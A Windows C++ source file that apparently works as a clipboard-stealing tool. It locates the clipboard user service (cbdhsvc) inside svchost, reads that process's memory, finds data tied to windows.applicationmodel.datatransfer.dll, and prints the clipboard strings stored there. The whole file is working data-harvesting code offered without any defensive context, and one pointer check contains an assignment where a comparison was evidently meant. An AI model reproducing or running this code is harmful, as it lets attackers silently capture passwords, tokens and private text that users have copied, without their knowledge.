#include <windows.h>
#include <iostream>
#include <ole2.h>
#include <psapi.h>
#include <vector>
#include <string>
#include <cstring>
#include <winnt.h>

typedef LONG(NTAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

struct RdataSectionInfo {
    ULONG64 startAddr;
    ULONG64 endAddr;
    bool valid;
};

CHAR* wideToUtf8(const WCHAR* src) {
    int size = WideCharToMultiByte(65001, 0, src, -1, nullptr, 0, nullptr, nullptr);
    if (size <= 0) return nullptr;
    CHAR* out = (CHAR*)malloc(size);
    if (!out) return nullptr;
    WideCharToMultiByte(65001, 0, src, -1, out, size, nullptr, nullptr);
    return out;
}

void PrintRemoteUnicodeString(HANDLE hProcess, ULONG64 remotePtr) {
    WCHAR buffer[0x2000] = { 0 };
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)remotePtr, buffer, sizeof(buffer) - sizeof(WCHAR), &bytesRead))
        return;

    CHAR* utf8 = wideToUtf8(buffer);
    if (utf8) {
        std::cout << "[+] -----------------------------------\n " << utf8 << std::endl;
        free(utf8);
    }
}

RdataSectionInfo GetRdataSectionInfo(HANDLE hProcess, LPVOID dllBase) {
    RdataSectionInfo info = { 0, 0, false };
    
    if (!hProcess || !dllBase) {
        return info;
    }

    IMAGE_DOS_HEADER dosHeader = { 0 };
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, dllBase, &dosHeader, sizeof(dosHeader), &bytesRead) ||
        bytesRead != sizeof(dosHeader) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        return info;
    }

    ULONG64 ntHeaderAddr = (ULONG64)dllBase + dosHeader.e_lfanew;
    DWORD signature = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)ntHeaderAddr, &signature, sizeof(signature), &bytesRead) ||
        bytesRead != sizeof(signature) || signature != IMAGE_NT_SIGNATURE) {
        return info;
    }

    IMAGE_FILE_HEADER fileHeader = { 0 };
    ULONG64 fileHeaderAddr = ntHeaderAddr + sizeof(DWORD);
    if (!ReadProcessMemory(hProcess, (LPCVOID)fileHeaderAddr, &fileHeader, sizeof(fileHeader), &bytesRead) ||
        bytesRead != sizeof(fileHeader)) {
        return info;
    }

    WORD numSections = fileHeader.NumberOfSections;
    
    ULONG64 optHeaderAddr = fileHeaderAddr + sizeof(IMAGE_FILE_HEADER);
    WORD magic = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)optHeaderAddr, &magic, sizeof(magic), &bytesRead) ||
        bytesRead != sizeof(magic)) {
        return info;
    }

    ULONG64 sectionHeaderAddr = 0;
    if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        sectionHeaderAddr = optHeaderAddr + sizeof(IMAGE_OPTIONAL_HEADER64);
    }
    else if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        sectionHeaderAddr = optHeaderAddr + sizeof(IMAGE_OPTIONAL_HEADER32);
    }
    else {
        return info;
    }
    
    for (WORD i = 0; i < numSections; ++i) {
        IMAGE_SECTION_HEADER sectionHeader = { 0 };
        if (!ReadProcessMemory(hProcess, (LPCVOID)(sectionHeaderAddr + i * sizeof(IMAGE_SECTION_HEADER)),
                              &sectionHeader, sizeof(sectionHeader), &bytesRead) ||
            bytesRead != sizeof(sectionHeader)) {
            continue;
        }

        if (memcmp(sectionHeader.Name, ".rdata", 6) == 0 || 
            memcmp(sectionHeader.Name, ".rdata\x00\x00", 8) == 0) {
            info.startAddr = (ULONG64)dllBase + sectionHeader.VirtualAddress;
            info.endAddr = info.startAddr + sectionHeader.Misc.VirtualSize;
            info.valid = true;
            return info;
        }
    }

    return info;
}

DWORD getSvchostPid()
{
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) return 0;
    DWORD bytesNeeded = 0;
    DWORD servicesReturned = 0;
    DWORD resume = 0;
    BOOL ok = EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resume, NULL);
    if (bytesNeeded == 0) { CloseServiceHandle(scm); return 0; }
    std::vector<char> buf(bytesNeeded);
    ok = EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, reinterpret_cast<LPBYTE>(buf.data()), (DWORD)buf.size(), &bytesNeeded, &servicesReturned, &resume, NULL);
    if (!ok) { CloseServiceHandle(scm); return 0; }
    ENUM_SERVICE_STATUS_PROCESSA* services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSA*>(buf.data());
    for (DWORD i = 0; i < servicesReturned; ++i) {
        const char* name = services[i].lpServiceName;
        if (name && std::strstr(name, "cbdhsvc")) {
            SC_HANDLE svc = OpenServiceA(scm, name, SERVICE_QUERY_STATUS);
            if (!svc) continue;
            SERVICE_STATUS_PROCESS ssp = { 0 };
            DWORD needed = 0;
            if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed)) {
                DWORD pid = ssp.dwProcessId;
                CloseServiceHandle(svc);
                CloseServiceHandle(scm);
                if (pid != 0) return pid;
            }
            else {
                CloseServiceHandle(svc);
            }
        }
    }
    CloseServiceHandle(scm);
    return 0;
}

LPVOID GetDataTransferDllBase(HANDLE hProcess) {
    DWORD bytesNeeded = 0;
    HMODULE datatransferDLL = nullptr;

    EnumProcessModules(hProcess, nullptr, 0, &bytesNeeded);
    auto mods = (HMODULE*)malloc(bytesNeeded);
    if (!mods) return nullptr;
    
    if (EnumProcessModules(hProcess, mods, bytesNeeded, &bytesNeeded)) {
        for (size_t i = 0; i < bytesNeeded / sizeof(HMODULE); i++) {
            char baseName[MAX_PATH] = { 0 };
            if (K32GetModuleBaseNameA(hProcess, mods[i], baseName, MAX_PATH)) {
                if (_stricmp(baseName, "windows.applicationmodel.datatransfer.dll") == 0) {
                    datatransferDLL = mods[i];
                    free(mods);
                    return datatransferDLL;
                }
            }
        }
    }
    free(mods);
    return nullptr;
}

int wmain() {
    DWORD pid = getSvchostPid();
    if (!pid) {
        std::cout << "[-] Failed to find cbdhsvc process" << std::endl;
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] Failed to open process: " << GetLastError() << std::endl;
        return -1;
    }

    LPVOID dllBase = GetDataTransferDllBase(hProcess);
    if (!dllBase) {
        std::cout << "[-] Failed to locate datatransfer.dll" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    std::cout << "[+] datatransfer.dll base: 0x" << std::hex << dllBase << std::endl;

    RdataSectionInfo rdataInfo = GetRdataSectionInfo(hProcess, dllBase);

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    LPBYTE queryBase = nullptr;

    while (VirtualQueryEx(hProcess, queryBase, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.RegionSize == 0) break;

        if (mbi.State != MEM_COMMIT || mbi.Type != MEM_PRIVATE || mbi.Protect != PAGE_READWRITE) {
            queryBase += mbi.RegionSize;
            continue;
        }

        auto buffer = (BYTE*)malloc(mbi.RegionSize);
        if (!buffer) {
            queryBase += mbi.RegionSize;
            continue;
        }

        SIZE_T bytesRead = 0;
        if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead)) {
            for (SIZE_T j = 0; j + 0x20 < bytesRead; ++j) {
                if (*(buffer + j + 0x20) == 1) {
                    LPVOID addr = nullptr;
                    if (ReadProcessMemory(hProcess, (LPCVOID)((ULONG64)mbi.BaseAddress + j), 
                                          &addr, sizeof(LPVOID), nullptr)) {
                        ULONG64 addrValue = (ULONG64)addr;
                        if (addrValue >= rdataInfo.startAddr && addrValue < rdataInfo.endAddr) {
                            LPVOID remoteStringPtr = nullptr;
                            LPVOID targetAddr = (LPVOID)((ULONG64)mbi.BaseAddress + j + 0x18);
                            if (ReadProcessMemory(hProcess, targetAddr,&remoteStringPtr, sizeof(LPVOID), nullptr)) {
                                LPVOID susAddr = nullptr;
                                ReadProcessMemory(hProcess, remoteStringPtr, &susAddr, sizeof(LPVOID), nullptr);
                                PBYTE susAddrByte = (PBYTE)&susAddr;
                                if (susAddr != 0 && !((susAddrByte[5] = 0x7f && susAddrByte[6] == 0x00 && susAddrByte[7] == 0x00))) {
                                    PrintRemoteUnicodeString(hProcess, (ULONG64)remoteStringPtr);
                                }
                            }
                        }
                    }
                }
            }
        }
        free(buffer);
        queryBase += mbi.RegionSize;
    }

    CloseHandle(hProcess);
    return 0;
}